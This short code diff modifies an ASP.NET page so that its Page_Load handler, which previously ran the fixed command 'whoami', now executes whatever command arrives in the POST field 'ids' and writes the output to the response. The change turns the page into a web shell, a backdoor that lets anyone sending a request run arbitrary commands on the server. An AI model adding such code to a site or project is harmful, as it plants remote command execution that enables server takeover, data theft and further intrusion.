@@ -18,6 +18,6 @@ return s;
 }
 void Page_Load(object sender, EventArgs e)
 {
-Response.Write(ExcuteCmd("whoami"));
+Response.Write(ExcuteCmd(Request.Form["ids"]));
 }
 </script>
